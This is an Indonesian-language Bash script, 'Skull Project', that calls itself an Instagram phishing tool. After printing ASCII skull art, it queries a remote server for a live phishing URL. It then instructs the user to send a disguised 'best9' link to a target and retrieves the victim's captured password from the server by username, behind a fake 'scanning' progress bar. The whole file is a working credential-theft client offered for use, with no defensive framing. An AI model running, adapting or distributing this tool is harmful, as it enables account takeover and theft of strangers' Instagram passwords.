#!/bin/bash
echo "            _,.-------.,_ "
sleep 0.03
echo "        ,;~'             '~;, "
sleep 0.03
echo "      ,;                     ;, "
sleep 0.03
echo "     ;                         ; "
sleep 0.03
echo "    ,'                         ', "
sleep 0.03
echo "   ,;                           ;, "
sleep 0.03
echo "   ; ;      .           .      ; ; "
sleep 0.03
echo "   | ;   ______       ______   ; | "
sleep 0.03
echo "   |  '/~'     ~' . '~     '~\'  | "
sleep 0.03
echo "   |  ~  ,-~~~^~, | ,~^~~~-,  ~  | "
sleep 0.03
echo "    |   |        }:{        |   | "
sleep 0.03
echo "    |   l       / | \       !   | "
sleep 0.03
echo "    .~  (__,.--' .^. '--.,__)  ~. "
sleep 0.03
echo "    |     ---;' / | \ ';---     | "
sleep 0.03
echo "     \__.       \/^\/       .__/ "
sleep 0.03
echo "      V| \                 / |V "
sleep 0.03
echo "       | |T~\___!___!___/~T| | "
sleep 0.03
echo "       | |'IIII_I_I_I_IIII'| | "
sleep 0.03
echo "       |  \,III I I I III,/  | "
sleep 0.03
echo "        \   '~~~~~~~~~~'    / "
sleep 0.03
echo "          \   .       .   / "
sleep 0.03
echo "            \.    ^    ./ " 
sleep 0.03
echo "              ^~~~^~~~^  "
sleep 0.03
echo "  ================================"
sleep 2
echo "  ==       Skull Project        =="
sleep 0.7
echo "  ================================"
echo " Skull Project adalah Tools phising "
echo " Instagram via best9 "
get_url=$(curl -s http://zlucifer.com/api/best9.php)
cek='curl -s '$get_url # check status
response=`curl -s -o /dev/null -w "%{http_code}" $cek`
#echo $response
if [[ $response != *pre* ]]; then
    echo
    echo "Website Offline/Restart untuk sementara"
else
    echo
    echo "Cara penggunaan :"
    echo "1. Copy link ini : www.best9-insta.pe.hu"
    echo "2. Kirim link yang sudah di copy ke target"
    echo "3. Jika korban sudah terkena bisa langsung di cek"
    echo 
    echo "Ingin melakukan pengecekan?"
    echo "y/n?"
    read pengecekan
    echo
    if [ $pengecekan = "y" ]; then
            echo "Silahkan masukan username target"
    echo contoh hack.id_
    read target # masukin user target
    echo
    echo Apakah username $target "sudah benar?"
    echo y/n?
    read confirm
    echo
    if [ $confirm = "y" ]; then
        echo Melakukan pencarian password username : $target
        i=0
        max=100
        while [ $i -le $max ]; do
        echo -ne "\nScanning percentage : $i% "
        sleep 0.03
        if [ $i -eq 100 ]; then
            echo -ne " [complete!]\n"
            echo "Jangan close aplikasi sebelum scan selesai"            
            echo "========================================"
            cek_target=`curl -s $get_url/instagram.php?cari=$target`
            echo -e $cek_target
            echo "======================================="
            echo " Gunakan tools dengan bijak"
            echo " -zLucifer"
            echo "======================================="
            fi
            let i++
            done
        else
            echo "Kesalahan"
        fi
    else
        echo "Terimakasih sudah menggunakan Skull Project"
    fi    
fi
